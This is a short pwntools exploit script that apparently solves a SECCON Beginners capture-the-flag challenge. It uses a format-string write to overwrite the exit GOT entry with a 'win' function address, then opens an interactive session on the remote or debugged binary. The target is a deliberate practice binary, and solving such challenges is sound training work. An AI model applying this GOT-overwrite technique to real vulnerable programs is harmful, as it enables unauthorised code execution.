from pwn import *
elf_file = FILENAME = './chall'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log



HOST = b'pure-and-easy.beginners.seccon.games'
POST = 9000
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  #c = process(FILENAME)
  c = gdb.debug(FILENAME,gdbscript='''b main''')

win = 0x401341
exit_got = 0x404040


def send_payload(payload):
    log.info(b"payload = %s" % repr(payload))
    c.sendline(payload)
    return c.recv()

fmtstr = FmtStr(execute_fmt=send_payload,offset=6,)
fmtstr.write(exit_got,win)
fmtstr.execute_writes()

c.interactive()